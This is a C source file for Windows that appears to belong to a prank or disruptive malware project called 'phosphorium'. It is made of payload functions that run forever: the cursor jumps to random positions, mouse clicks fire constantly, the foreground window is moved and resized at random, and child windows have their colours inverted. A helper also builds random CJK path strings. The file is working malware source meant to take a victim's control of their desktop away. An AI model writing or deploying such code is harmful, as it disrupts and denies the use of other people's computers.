#include "phosphorium.h"

VOID
GetRandPath(
	_In_ LPWSTR szRand,
	_In_ CONST INT nLength
)
{
	for (INT i = 0; i < nLength; i++)
	{
		szRand[i] = (WCHAR)(rand() % (0x9FFF - 0x4E00 + 1) + 0x4E00);
	}
}

BOOL
WINAPI
CursorMove(VOID)
{
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	for (;;)
	{
		INT nX = Xorshift32() % w;
		INT nY = Xorshift32() % h;

		SetCursorPos(nX, nY);
	}

	return TRUE;
}

BOOL
WINAPI
CursorClicker(VOID)
{
	for (;;)
	{
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, NULL, 0, NULL, 0);
		mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, NULL, 0, NULL, 0);
		Sleep(Xorshift32() % 10);
	}

	return TRUE;
}

BOOL
WINAPI
WindowMove(VOID)
{
	INT w = GetSystemMetrics(SM_CXSCREEN);
	INT h = GetSystemMetrics(SM_CYSCREEN);

	for (;;)
	{
		INT nX = Xorshift32() % w;
		INT nY = Xorshift32() % h;

		HWND hWindow = GetForegroundWindow();
		MoveWindow(hWindow, Xorshift32() % w, rand() % h, Xorshift32() % w, Xorshift32() % h, FALSE);
		Sleep(Xorshift32() % 10);
	}

	return TRUE;
}

BOOL
CALLBACK
EnumChildWindowsProc(
	_In_ HWND hWindow,
	_In_ LPARAM longPtr
)
{
	RECT rcWindow;
	GetWindowRect(hWindow, &rcWindow);

	HDC hdc = GetDC(hWindow);
	INT nWindowWidth = rcWindow.right - rcWindow.left;
	INT nWindowHeight = rcWindow.bottom - rcWindow.top;

	PatBlt(hdc, 0, 0, nWindowWidth, nWindowHeight, PATINVERT);
	ReleaseDC(NULL, hdc);
	DeleteObject(hdc);

	EnumChildWindows(hWindow, EnumChildWindowsProc, NULL);
	return TRUE;
}

VOID
WINAPI
WindowInvertPayload(VOID)
{
	for (;;)
	{
		EnumChildWindows(GetForegroundWindow(), EnumChildWindowsProc, NULL);
		Sleep(10);
	}
}